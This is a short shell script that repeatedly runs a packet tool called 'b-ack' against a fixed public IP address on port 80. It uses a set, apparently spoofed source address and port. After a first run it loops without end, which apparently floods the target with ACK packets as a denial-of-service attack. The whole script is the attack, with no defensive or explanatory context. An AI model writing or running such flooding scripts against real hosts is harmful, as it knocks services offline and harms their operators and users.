#!/bin/sh
dip=202.108.255.203 
date; ./b-ack -s 169.154.136.43 -o 2002 -d $dip -p 80 -i eth3 -t 19 -E yhkw.txt -A

while [ 2 -lt 10 ]
do
date; ./b-ack -s 169.154.136.43 -o 2002 -d $dip -p 80 -i eth3 -t 19 -A
done


